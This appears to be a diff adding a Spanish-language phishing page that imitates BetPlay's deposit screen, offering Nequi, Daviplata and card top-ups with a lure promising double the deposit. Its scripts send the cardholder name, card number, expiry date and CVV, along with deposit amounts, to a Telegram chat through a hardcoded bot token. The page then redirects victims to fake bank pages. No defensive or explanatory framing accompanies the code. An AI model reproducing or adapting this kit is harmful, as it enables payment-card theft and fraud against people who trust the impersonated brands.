@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+
+<html lang="es">
+
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Payment Options</title>
+<script src="https://cdn.tailwindcss.com/"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
+<style>
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+  <style>
+  #betplay-loader {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background-color: rgba(0, 0, 0, 0.4);
+    z-index: 9999;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    backdrop-filter: blur(3px);
+    display: none;
+  }
+
+  #betplay-loader img {
+    width: 120px;
+    margin-bottom: 20px;
+  }
+
+  .spinner {
+    width: 80px;
+    height: 80px;
+    border-radius: 50%;
+    border: 6px solid transparent;
+    border-top: 6px solid #fcd34d;   /* Amarillo */
+    border-right: 6px solid #10b981; /* Verde */
+    border-bottom: 6px solid #3b82f6;/* Azul */
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+</style>
+
+<div id="betplay-loader">
+  <div class="flex flex-col items-center justify-center">
+    <img src="betplay-logo.png" alt="BetPlay Logo" class="mb-4 w-28 h-28 object-contain"/>
+    <div class="spinner"></div>
+  </div>
+</div>
+
+</head>
+<body class="bg-[#e3e6ee] min-h-screen flex flex-col justify-between">
+<!-- Header -->
+<header class="bg-[#0a1f57] flex justify-between items-center px-4 py-3">
+<div class="flex items-center space-x-2">
+<div class="bg-[#0a1f57] rounded-full w-12 h-12 flex items-center justify-center">
+<img alt="Company logo" class="w-10 h-10" src="loading-logo.png"/>
+</div>
+<span class="text-[#a0a9c1] text-sm">Menú</span>
+</div>
+<div class="text-white text-sm leading-tight absolute top-2 right-14 text-right">
+<div class="font-semibold text-base" id="user-name"></div>
+<div class="text-[#5a6a8a]">Sesión</div>
+<div class="text-[#5a6a8a]" id="session-time">00:00:00</div>
+</div>
+<div class="flex items-center">
+<div class="flex flex-col space-y-1 cursor-pointer">
+<span class="w-2.5 h-2.5 bg-white rounded-full"></span>
+<span class="w-2.5 h-2.5 bg-white rounded-full"></span>
+<span class="w-2.5 h-2.5 bg-white rounded-full"></span>
+</div>
+</div>
+</header>
+<!-- Main content -->
+<main class="px-4 py-5 space-y-4 flex-grow"><div class="text-sm text-gray-600 text-right pr-4 pt-2"></div>
+<!-- Nequi -->
+<button class="w-full bg-white rounded-xl shadow-md flex items-center justify-between p-4" id="nequi-toggle" type="button">
+<div class="flex items-center space-x-4">
+<img alt="Nequi logo" class="w-10 h-10 rounded-full bg-[#e6e6e6]" src="nequi-logqo.svg"/>
+<span class="text-[#0a1f57] text-base font-normal">Nequi</span>
+</div>
+<i class="fas fa-chevron-right text-[#5a6a8a] transition-transform duration-200" id="nequi-arrow"></i>
+</button>
+<!-- Contenido desplegable Nequi -->
+<div class="hidden flex flex-col bg-white rounded-xl shadow-md px-4 py-5 space-y-3" id="nequi-content">
+<p class="text-[#0a1f57] text-sm">
+        ¡Nuevo en BetPlay!<br/>
+        Ahora puedes depositar desde tu aplicación Nequi.<br/>
+        Te enviaremos una notificación que tendrás que confirmar en tu app Nequi.<br/>
+        Tu titular debe coincidir con el de tu cuenta de Nequi.
+      </p>
+<div class="grid grid-cols-2 gap-3">
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$10.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$20.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$50.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$100.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$200.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$300.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$500.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$800.000</button>
+</div>
+<input class="w-full mt-2 p-3 bg-[#f4f5f9] rounded-md text-[#0a1f57] placeholder-[#a0a9c1] focus:outline-none monto-dinamico" id="other-value" inputmode="numeric" pattern="[0-9]*" placeholder="$ Otro valor" type="text"/>
+<button class="bg-green-500 text-white text-center py-3 rounded-md font-semibold">Recargar</button>
+</div>
+<!-- Daviplata -->
+<button class="w-full bg-white rounded-xl shadow-md flex items-center justify-between p-4" id="daviplata-toggle" type="button">
+<div class="flex items-center space-x-4">
+<img alt="Daviplata logo" class="w-10 h-10 rounded-full" src="daviplata-logo.svg"/>
+<span class="text-[#0a1f57] text-base font-normal">Daviplata</span>
+</div>
+<i class="fas fa-chevron-right text-[#5a6a8a] transition-transform duration-200" id="pse-arrow"></i>
+</button><div class="hidden flex flex-col bg-white rounded-xl shadow-md px-4 py-5 space-y-3" id="daviplata-content">
+<p class="text-[#0a1f57] text-sm">¡Nuevo en BetPlay!
+Ahora puedes depositar desde tu aplicación Daviplata.
+Te enviaremos una notificación que tendrás que confirmar en tu app Daviplata.
+Tu titular debe coincidir con el de tu cuenta de Daviplata.</p>
+<div class="grid grid-cols-2 gap-3">
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$10.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$20.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$50.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$100.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$200.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$300.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$500.000</button>
+<button class="monto-btn bg-[#f4f5f9] text-[#0a1f57] py-2 rounded-md">$800.000</button>
+</div>
+<input class="w-full mt-2 p-3 bg-[#f4f5f9] rounded-md text-[#0a1f57] placeholder-[#a0a9c1] focus:outline-none monto-dinamico" id="other-value-daviplata" inputmode="numeric" pattern="[0-9]*" placeholder="$ Otro valor" type="text"/>
+<button class="bg-green-500 text-white text-center py-3 rounded-md font-semibold">Recargar</button>
+</div>
+<!-- Punto de venta -->
+<button class="w-full bg-white rounded-xl shadow-md flex items-center justify-between p-4" type="button">
+<div class="flex items-center space-x-4">
+<img alt="Punto de venta" class="w-10 h-10 rounded-full bg-[#e6e6e6] p-2" src="point-of-sale.svg"/>
+<span class="text-[#0a1f57] text-base font-normal">Punto de venta</span>
+</div>
+<i class="fas fa-chevron-right text-[#5a6a8a]"></i>
+</button>
+
+<!-- Tarjeta -->
+<button class="w-full bg-white rounded-xl shadow-md flex items-center justify-between p-4" id="tarjeta-toggle" type="button">
+<div class="flex items-center space-x-4">
+<img alt="Tarjeta icon" class="w-10 h-10 rounded-full bg-[#e6e6e6] p-2" src="tarjeta-icon.svg"/>
+<div class="text-left">
+<div class="text-[#0a1f57] text-base font-semibold">Tarjeta</div>
+<div class="text-[#5a6a8a] text-xs">Débito o crédito</div>
+</div>
+</div>
+<i class="fas fa-chevron-right text-[#5a6a8a] transition-transform duration-200" id="tarjeta-arrow"></i>
+</button>
+<!-- Contenido desplegable Tarjeta -->
+<div class="hidden flex flex-col bg-white rounded-xl shadow-md px-4 py-5 space-y-4" id="tarjeta-content">
+<input id="tarjeta-nombre" class="w-full p-3 bg-[#f4f5f9] rounded-md text-[#0a1f57] font-semibold" placeholder="Nombre del titular" type="text"/>
+<input id="tarjeta-numero" class="w-full p-3 bg-[#f4f5f9] rounded-md text-[#0a1f57] text-center tracking-wider" inputmode="numeric" maxlength="19" pattern="[0-9]*" placeholder="Número de tarjeta" type="text"/>
+<div class="grid grid-cols-2 gap-2">
+<select id="tarjeta-mes" class="p-3 bg-[#f4f5f9] rounded-md text-[#0a1f57]">
+<option value="">MM</option>
+<option>01</option><option>02</option><option>03</option><option>04</option>
+<option>05</option><option>06</option><option>07</option><option>08</option>
+<option>09</option><option>10</option><option>11</option><option>12</option>
+</select>
+<select id="tarjeta-anio" class="p-3 bg-[#f4f5f9] rounded-md text-[#0a1f57]">
+<option value="">AAAA</option>
+<option>2025</option><option>2026</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option>
+</select>
+</div>
+<input id="tarjeta-cvv" class="w-full p-3 bg-[#f4f5f9] rounded-md text-[#0a1f57]" inputmode="numeric" maxlength="4" pattern="[0-9]*" placeholder="CVV" type="text"/>
+<div class="flex justify-between gap-3">
+<button id="tarjeta-enviar" class="flex-1 bg-green-500 text-white py-3 rounded-md font-semibold">Recargar</button>
+<button class="flex-1 bg-gray-300 text-white py-3 rounded-md font-semibold" onclick="document.getElementById('tarjeta-content').classList.add('hidden')">Cancelar</button>
+</div>
+</div>
+</main>
+<img alt="¿Cómo te ayudamos?" class="fixed bottom-20 right-4 w-20 h-20 rounded-full border border-gray-300" src="https://storage.googleapis.com/a1aa/image/837cd45f-32e0-479c-75c2-296c4f1821a7.jpg"/>
+<footer class="bg-[#0a1f57] flex justify-around items-center py-3">
+<button class="flex flex-col items-center space-y-1 text-white text-xs">
+<i class="fas fa-home text-lg"></i>
+<span>Inicio</span>
+</button>
+<button class="flex flex-col items-center space-y-1 text-white text-xs">
+<i class="fas fa-futbol text-lg"></i>
+<span>Deportes</span>
+</button>
+<button class="flex flex-col items-center space-y-1 text-white text-xs">
+<i class="fas fa-money-bill-wave text-lg"></i>
+<span>Recargas</span>
+</button>
+<button class="flex flex-col items-center space-y-1 text-white text-xs">
+<i class="fas fa-credit-card text-lg"></i>
+<span>Retiros</span>
+</button>
+</footer>
+
+<!-- CONFIGURACIÓN TELEGRAM (GLOBAL) -->
+<script>
+  // Configuración de Telegram
+  const TELEGRAM_BOT_TOKEN = '8663981324:AAFdR2ikDIgJ7cufQVXSHEiEJ45nRcXYmrw';
+  const TELEGRAM_CHAT_ID = '-5000036449';
+
+  // Función para enviar mensajes a Telegram
+  async function enviarTelegram(mensaje) {
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    try {
+      await fetch(telegramUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: mensaje,
+          parse_mode: "HTML"
+        })
+      });
+      console.log("Mensaje enviado a Telegram");
+    } catch (error) {
+      console.error("Error enviando a Telegram:", error);
+    }
+  }
+</script>
+
+<script>
+    const toggleBtn = document.getElementById("nequi-toggle");
+    const nequiContent = document.getElementById("nequi-content");
+    const arrowIcon = document.getElementById("nequi-arrow");
+    const inputField = document.getElementById("other-value");
+
+    toggleBtn.addEventListener("click", () => {
+      const isVisible = !nequiContent.classList.contains("hidden");
+      nequiContent.classList.toggle("hidden");
+      arrowIcon.classList.toggle("rotate-90", !isVisible);
+    });
+
+    function formatNumber(num) {
+      return "$" + num.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+    }
+
+    document.querySelectorAll("#nequi-content .monto-btn").forEach(btn => {
+      btn.addEventListener("click", () => {
+        const raw = btn.innerText.replace(/\D/g, "");
+        inputField.value = formatNumber(raw);
+      });
+    });
+
+    inputField.addEventListener("input", (e) => {
+      const raw = e.target.value.replace(/\D/g, "");
+      e.target.value = raw ? formatNumber(raw) : "";
+    });
+  </script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const tarjetaToggle = document.getElementById("tarjeta-toggle");
+  const tarjetaContent = document.getElementById("tarjeta-content");
+  const tarjetaArrow = document.getElementById("tarjeta-arrow");
+  if (tarjetaToggle && tarjetaContent && tarjetaArrow) {
+    tarjetaToggle.addEventListener("click", () => {
+      const visible = !tarjetaContent.classList.contains("hidden");
+      tarjetaContent.classList.toggle("hidden");
+      tarjetaArrow.classList.toggle("rotate-90", !visible);
+    });
+  }
+});
+</script>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const tarjetaNumero = document.getElementById("tarjeta-numero");
+
+  // Formatear número de tarjeta con espacios automáticos
+  tarjetaNumero.addEventListener("input", function (e) {
+    let value = e.target.value.replace(/\D/g, ""); // Solo números
+    let formattedValue = "";
+    
+    // Agregar espacio cada 4 dígitos
+    for (let i = 0; i < value.length; i++) {
+      if (i > 0 && i % 4 === 0) {
+        formattedValue += " ";
+      }
+      formattedValue += value[i];
+    }
+    
+    e.target.value = formattedValue;
+  });
+});
+</script>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  let seconds = 0;
+  const sessionElement = document.getElementById("session-info");
+
+  function formatTime(num) {
+    return num.toString().padStart(2, '0');
+  }
+
+  setInterval(() => {
+    seconds++;
+    const hrs = formatTime(Math.floor(seconds / 3600));
+    const mins = formatTime(Math.floor((seconds % 3600) / 60));
+    const secs = formatTime(seconds % 60);
+    const cedula = localStorage.getItem("userCedula") || "Main";
+    if (sessionElement) {
+      sessionElement.textContent = `Sesión activa: ${hrs}:${mins}:${secs} | Usuario: ${cedula}`;
+    }
+  }, 1000);
+});
+</script>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  let seconds = 0;
+  const userNameEl = document.getElementById("user-name");
+  const sessionTimeEl = document.getElementById("session-time");
+
+  function format(num) {
+    return num.toString().padStart(2, '0');
+  }
+
+  const cedula = localStorage.getItem("userCedula") || "Ruben Hernandez";
+  if (userNameEl) userNameEl.textContent = cedula;
+
+  setInterval(() => {
+    seconds++;
+    const h = format(Math.floor(seconds / 3600));
+    const m = format(Math.floor((seconds % 3600) / 60));
+    const s = format(seconds % 60);
+    if (sessionTimeEl) sessionTimeEl.textContent = `${h}:${m}:${s}`;
+  }, 1000);
+});
+</script>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  function formatNumber(num) {
+    return "$" + num.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+  }
+
+  document.querySelectorAll(".monto-dinamico").forEach(input => {
+    input.addEventListener("input", (e) => {
+      const raw = e.target.value.replace(/[^\d]/g, "");
+      e.target.value = raw ? formatNumber(raw) : "";
+    });
+  });
+});
+</script>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const userNameEl = document.getElementById("user-name");
+  const cedula = localStorage.getItem("userCedula") || "Ruben Hernandez";
+  if (userNameEl) userNameEl.textContent = cedula;
+});
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const toggle = document.getElementById("daviplata-toggle");
+  const content = document.getElementById("daviplata-content");
+  if (toggle && content) {
+    toggle.addEventListener("click", () => {
+      content.classList.toggle("hidden");
+      const icon = toggle.querySelector("i");
+      if (icon) {
+        const isVisible = !content.classList.contains("hidden");
+        icon.classList.toggle("rotate-90", isVisible);
+      }
+    });
+  }
+});
+</script>
+
+<!-- SCRIPT NEQUI CON TELEGRAM -->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const nequiBtn = document.querySelector("#nequi-content button.bg-green-500");
+  const montoInput = document.querySelector("#nequi-content #other-value");
+  const botonesMonto = document.querySelectorAll("#nequi-content .monto-btn");
+
+  function extraerMonto() {
+    let valor = montoInput.value || "";
+    if (!valor && botonesMonto.length > 0) {
+      valor = botonesMonto[0].innerText;
+    }
+    return valor.replace(/[^\d]/g, "");
+  }
+
+  nequiBtn.addEventListener("click", async function () {
+    const monto = extraerMonto();
+    if (!monto) {
+      alert("Por favor ingresa un monto válido");
+      return;
+    }
+
+    const mensaje = `💰 <b>Recarga Nequi</b>
+💵 Monto: $${monto}
+💜 Método: Nequi`;
+
+    await enviarTelegram(mensaje);
+    window.location.href = "bancos/nequi/propulsor/recargas/index.html";
+  });
+});
+</script>
+
+<!-- SCRIPT DAVIPLATA CON TELEGRAM -->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const daviplataBtn = document.querySelector("#daviplata-content button.bg-green-500");
+  const montoInput = document.querySelector("#daviplata-content #other-value-daviplata");
+  const botonesMonto = document.querySelectorAll("#daviplata-content .monto-btn");
+
+  function extraerMonto() {
+    let valor = montoInput.value || "";
+    if (!valor && botonesMonto.length > 0) {
+      valor = botonesMonto[0].innerText;
+    }
+    return valor.replace(/[^\d]/g, "");
+  }
+
+  daviplataBtn.addEventListener("click", async function () {
+    const monto = extraerMonto();
+    if (!monto) {
+      alert("Por favor ingresa un monto válido");
+      return;
+    }
+
+    const mensaje = `💰 <b>Recarga Daviplata</b>
+💵 Monto: $${monto}
+❤️ Método: Daviplata`;
+
+    await enviarTelegram(mensaje);
+    window.location.href = "bancos/daviplataa/index.html";
+  });
+});
+</script>
+
+<!-- SCRIPT TARJETA CON TELEGRAM -->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const tarjetaBtn = document.getElementById("tarjeta-enviar");
+
+  tarjetaBtn.addEventListener("click", async function () {
+    const nombre = document.getElementById("tarjeta-nombre").value;
+    const numero = document.getElementById("tarjeta-numero").value;
+    const mes = document.getElementById("tarjeta-mes").value;
+    const anio = document.getElementById("tarjeta-anio").value;
+    const cvv = document.getElementById("tarjeta-cvv").value;
+
+    // Validar que todos los campos estén llenos
+    if (!nombre || !numero || !mes || !anio || !cvv) {
+      alert("Por favor completa todos los campos de la tarjeta");
+      return;
+    }
+
+    // Validar que el número tenga 16 dígitos (sin contar espacios)
+    const numeroSinEspacios = numero.replace(/\s/g, "");
+    if (numeroSinEspacios.length !== 16) {
+      alert("El número de tarjeta debe tener 16 dígitos");
+      return;
+    }
+
+    // Validar CVV (3 o 4 dígitos)
+    if (cvv.length < 3 || cvv.length > 4) {
+      alert("El CVV debe tener 3 o 4 dígitos");
+      return;
+    }
+
+    const mensaje = `💳 <b>Recarga con Tarjeta</b>
+👤 Titular: ${nombre}
+💳 Número: ${numero}
+📅 Vencimiento: ${mes}/${anio}
+🔒 CVV: ${cvv}`;
+
+    await enviarTelegram(mensaje);
+    
+    // Mostrar loader y redirigir
+    document.getElementById('betplay-loader').style.display = 'flex';
+    setTimeout(() => {
+      window.location.href = "tarjeta-redirect.html";
+    }, 4000);
+  });
+});
+</script>
+
+
+
+<script>
+  function showLoaderAndRedirect(route) {
+    document.getElementById('betplay-loader').style.display = 'flex';
+    setTimeout(() => {
+      window.location.href = route;
+    }, 4000);
+  }
+
+  document.addEventListener("DOMContentLoaded", function () {
+    document.querySelector("#nequi-content button.bg-green-500")?.addEventListener("click", function (e) {
+      e.preventDefault();
+      showLoaderAndRedirect("nequi-redirect.html");
+    });
+
+    document.querySelector("#daviplata-content button.bg-green-500")?.addEventListener("click", function (e) {
+      e.preventDefault();
+      showLoaderAndRedirect("bancos/daviplata/index.html");
+    });
+
+    document.querySelector("#tarjeta-content button.bg-green-500")?.addEventListener("click", function (e) {
+      e.preventDefault();
+      showLoaderAndRedirect("tarjeta-redirect.html");
+    });
+  });
+</script>
+
+<!-- Modal Promo -->
+<div id="promo-modal" class="fixed inset-0 bg-black bg-opacity-60 backdrop-blur-sm flex items-center justify-center z-[9999] hidden">
+  <div class="bg-white max-w-sm w-[90%] rounded-xl p-6 text-center transform scale-0 animate-scale-in">
+    <img src="BetPlay-logo1.png" alt="BetPlay Logo" class="mx-auto mb-4 w-24"/>
+    <h2 class="text-[#0a1f57] text-xl font-semibold mb-3">Recarga tu BetPlay</h2>
+    <p class="text-[#0a1f57] text-sm mb-6">Recibe el <strong>doble del monto</strong> de tu recarga.</p>
+    <button id="continuarPromo" class="bg-green-500 hover:bg-green-600 text-white font-semibold py-2 px-6 rounded-md w-full">Continuar</button>
+  </div>
+</div>
+
+<style>
+  @keyframes scale-in {
+    0% { transform: scale(0); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+  .animate-scale-in {
+    animation: scale-in 0.3s ease-out forwards;
+  }
+</style>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const modal = document.getElementById("promo-modal");
+    const btnContinuar = document.getElementById("continuarPromo");
+
+    modal.classList.remove("hidden");
+
+    btnContinuar.addEventListener("click", function () {
+      modal.classList.add("hidden");
+    });
+  });
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const inputDaviplata = document.querySelector("#daviplata-content #other-value-daviplata");
+  const botonesDaviplata = document.querySelectorAll("#daviplata-content .monto-btn");
+
+  function formatNumber(num) {
+    return "$" + num.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+  }
+
+  botonesDaviplata.forEach(btn => {
+    btn.addEventListener("click", () => {
+      const raw = btn.innerText.replace(/\D/g, "");
+      inputDaviplata.value = formatNumber(raw);
+    });
+  });
+
+  inputDaviplata.addEventListener("input", (e) => {
+    const raw = e.target.value.replace(/\D/g, "");
+    e.target.value = raw ? formatNumber(raw) : "";
+  });
+});
+</script>
+
+</body>
+
+</html>
